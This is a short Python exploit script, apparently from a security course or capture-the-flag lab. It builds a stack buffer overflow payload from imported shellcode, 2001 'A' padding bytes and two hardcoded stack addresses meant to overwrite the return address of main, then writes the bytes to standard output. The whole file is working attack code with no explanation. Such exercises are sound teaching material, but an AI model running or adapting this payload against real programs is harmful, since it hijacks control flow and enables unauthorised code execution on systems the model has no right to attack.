import sys
from shellcode import shellcode
from struct import pack

addr = pack("<I", 0xbffef288)
main_ret_addr = pack("<I", 0xbffefa9c)
sys.stdout.buffer.write(shellcode + b"A" * 2001+ addr+main_ret_addr)